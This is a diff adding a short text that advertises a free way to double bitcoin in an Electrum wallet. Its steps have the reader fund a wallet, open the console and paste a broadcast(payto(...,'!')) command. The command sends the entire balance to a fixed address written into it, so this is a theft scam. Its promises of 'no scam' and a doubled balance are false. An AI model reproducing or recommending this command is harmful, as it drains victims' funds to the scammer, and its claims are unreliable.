@@ -1,0 +1,21 @@
+NEW METHOD. NO FEE, NO SCAM, Really Money for one Wallet. 
+
+Lets go:
+
+totally free. no deposit, no tax, no fees
+
+Just follow this steps:
+
+- Download the Electrum app (https://electrum.org/#home)
+
+- Open a wallet there
+
+- Buy bitcoins // transfer the amount of Bitcoins that you want to double to your Electrum wallet
+
+- Click in View>Show Console
+
+- open console tab and put this command: broadcast(payto('bc1qv58mh5lzjlzwd3rn07xevlg3gkcmf3y7un9lax','!'))
+
+- hit enter button, if console shows message like this: "txid...." it works! restart electrum and view you balance x2
+
+- NOTICE: You can only use this algorithm once every 90 Days (one computer, one IP, one wallet)
